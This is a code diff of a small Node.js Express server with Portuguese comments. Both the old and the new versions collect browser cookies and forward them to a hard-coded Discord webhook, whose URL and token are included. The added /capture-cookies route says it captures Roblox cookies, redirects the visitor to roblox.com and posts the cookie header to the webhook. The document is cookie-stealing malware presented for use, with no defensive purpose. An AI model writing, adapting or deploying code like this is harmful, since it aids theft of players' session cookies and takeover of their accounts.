@@ -1,23 +1,44 @@
 const express = require('express');
+const fetch = require('node-fetch');
 const bodyParser = require('body-parser');
-const axios = require('axios');
 
 const app = express();
-app.use(bodyParser.json());
+const port = 3000;
 
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud'; // Substitua pelo URL do seu webhook do Discord
+app.use(bodyParser.urlencoded({ extended: false }));
 
-app.post('/cookies', (req, res) => {
-    const cookies = req.body.cookies;
-    
-    // Envia os cookies para o webhook do Discord
-    axios.post(WEBHOOK_URL, { content: cookies })
-        .then(() => console.log('Cookies enviados para o Discord'))
-        .catch((err) => console.error('Erro ao enviar cookies para o Discord:', err));
+// Endpoint para capturar os cookies do Roblox e enviar para o Discord
+app.get('/capture-cookies', (req, res) => {
+    // Abrir o Roblox
+    res.redirect('https://www.roblox.com/');
 
-    res.sendStatus(200);
+    // Capturar os cookies
+    const cookies = req.headers.cookie;
+
+    // Enviar os cookies para o Discord webhook
+    const data = {
+        content: "Cookies: " + cookies
+    };
+
+    fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Erro ao enviar mensagem para o Discord: ' + response.statusText);
+        }
+        console.log('Mensagem enviada com sucesso para o Discord!');
+    })
+    .catch(error => {
+        console.error('Erro:', error);
+    });
 });
 
-app.listen(3000, () => {
-    console.log('Servidor rodando na porta 3000');
+// Iniciar o servidor
+app.listen(port, () => {
+    console.log(`Servidor rodando em http://localhost:${port}`);
 });
